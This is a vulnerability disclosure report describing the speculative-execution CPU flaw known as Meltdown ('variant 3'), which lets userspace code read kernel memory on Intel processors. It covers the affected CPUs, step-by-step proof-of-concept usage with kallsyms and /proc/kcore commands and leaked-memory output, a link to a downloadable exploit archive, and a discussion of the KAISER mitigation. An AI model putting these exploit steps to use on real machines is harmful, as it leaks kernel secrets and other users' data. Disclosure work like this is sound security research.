== INTRODUCTION ==
This is a bug report about a CPU security issue that affects
processors by Intel, AMD and (to some extent) ARM.

I have written a PoC for this issue that, when executed in userspace
on an Intel Xeon CPU E5-1650 v3 machine with a modern Linux kernel,
can leak around 2000 bytes per second from Linux kernel memory after a
~4-second startup, in a 4GiB address space window, with the ability to
read from random offsets in that window. The same thing also works on
an AMD PRO A8-9600 R7 machine, although a bit less reliably and slower.

On the Intel CPU, I also have preliminary results that suggest that it
may be possible to leak host memory (which would include memory owned
by other guests) from inside a KVM guest.

The attack doesn't seem to work as well on ARM - perhaps because ARM
CPUs don't perform as much speculative execution because of a
different performance-energy-tradeoff or so?

All PoCs are written against specific processors and will likely
require at least some adjustments before they can run in other
environments, e.g. because of hardcoded timing tresholds.

############################################################

On the following Intel CPUs (the only ones tested so far), we managed
to leak information using another variant of this issue ("variant 3").
So far, we have not managed to leak information this way on AMD or ARM CPUs.

 - Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz (in a workstation)
 - Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz (in a laptop)

Apparently, on Intel CPUs, loads from kernel mappings in ring 3 during
speculative execution have something like the following behavior:

 - If the address is not mapped (perhaps also under other
   conditions?), instructions that depend on the load are not executed.
 - If the address is mapped, but not sufficiently cached, the load loads zeroes.
   Instructions that depend on the load are executed.
   Perhaps Intel decided that in case of a sufficiently high-latency load,
   it makes sense to speculate ahead with a dummy value to get a chance to
   prefetch cachelines for dependent loads, or something like that?
 - If the address is sufficiently cached, the load loads the data stored at the
   given address, without respecting the privilege level.
   Instructions that depend on the load are executed.
   This is the vulnerable case.


I have attached a PoC that works on both tested Intel systems, named
intel_kernel_read_poc.tar. Usage:

As root, determine where the core_pattern is in the kernel:

=====
# grep core_pattern /proc/kallsyms
ffffffff81e8aea0 D core_pattern
=====

Then, as a normal user, unpack the PoC and use it to leak the
core_pattern (and potentially other cached things around it) from
kernel memory, using the pointer from the previous step:

=====
$ cat /proc/sys/kernel/core_pattern
/cores/%E.%p.%s.%t
$ ./compile.sh && time ./poc_test ffffffff81e8aea0 4096
ffffffff81e8aea0  2f 63 6f 72 65 73 2f 25 45 2e 25 70 2e 25 73 2e
|/cores/%E.%p.%s.|
ffffffff81e8aeb0  25 74 00 61 70 70 6f 72 74 20 25 70 20 25 73 20
|%t.apport %p %s |
ffffffff81e8aec0  25 63 20 25 50 00 00 00 00 00 00 00 00 00 00 00  |%c
%P...........|
[ zeroes ]
ffffffff81e8af20  c0 a4 e8 81 ff ff ff ff c0 af e8 81 ff ff ff ff
|................|
ffffffff81e8af30  20 8e f0 81 ff ff ff ff 75 d9 cd 81 ff ff ff ff  |
.......u.......|
[ zeroes ]
ffffffff81e8bb60  65 5b cf 81 ff ff ff ff 00 00 00 00 00 00 00 00
|e[..............|
ffffffff81e8bb70  00 00 00 00 6d 41 00 00 00 00 00 00 00 00 00 00
|....mA..........|
[ zeroes ]

real 0m13.726s
user 0m9.820s
sys 0m3.908s
=====

As you can see, the core_pattern, part of the previous core_pattern (behind the
first nullbyte) and a few kernel pointers were leaked.

To confirm whether other leaked kernel data was leaked correctly, use gdb as
root to read kernel memory:

=====
# gdb /bin/sleep /proc/kcore
[...]
(gdb) x/4gx 0xffffffff81e8af20
0xffffffff81e8af20: 0xffffffff81e8a4c0 0xffffffff81e8afc0
0xffffffff81e8af30: 0xffffffff81f08e20 0xffffffff81cdd975
(gdb) x/4gx 0xffffffff81e8bb60
0xffffffff81e8bb60: 0xffffffff81cf5b65 0x0000000000000000
0xffffffff81e8bb70: 0x0000416d00000000 0x0000000000000000
=====

Note that the PoC will report uncached bytes as zeroes.


To Intel:
Please tell me if you have trouble reproducing this issue.
Given how different my two test machines are, I would be surprised if this
didn't just work out of the box on other CPUs from the same generation.
This PoC doesn't have hardcoded timings or anything like that.

We have not yet tested whether this still works after a TLB flush.


Regarding possible mitigations:

A short while ago, Daniel Gruss presented KAISER:
https://gruss.cc/files/kaiser.pdf
https://lkml.org/lkml/2017/5/4/220 (cached:
https://webcache.googleusercontent.com/search?q=cache:Vys_INYdkOMJ:https://lkml.org/lkml/2017/5/4/220+&cd=1&hl=en&ct=clnk&gl=ch
)
https://github.com/IAIK/KAISER

Basically, the issue that KAISER tries to mitigate is that on Intel
CPUs, the timing of a pagefault reveals whether the address is
unmapped or mapped as kernel-only (because for an unmapped address, a
pagetable walk has to occur while for a mapped address, the TLB can be
used). KAISER duplicates the top-level pagetables of all processes and
switches them on kernel entry and exit. The kernel's top-level
pagetable looks as before. In the top-level pagetable used while
executing userspace code, most entries that are only used by the
kernel are zeroed out, except for the kernel text and stack that are
necessary to execute the syscall/exception entry code that has to
switch back the pagetable.

I suspect that this approach might also be usable for mitigating
variant 3, but I don't know how much TLB flushing / data cache
flushing would be necessary to make it work.


Proof of Concept:
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/43490.zip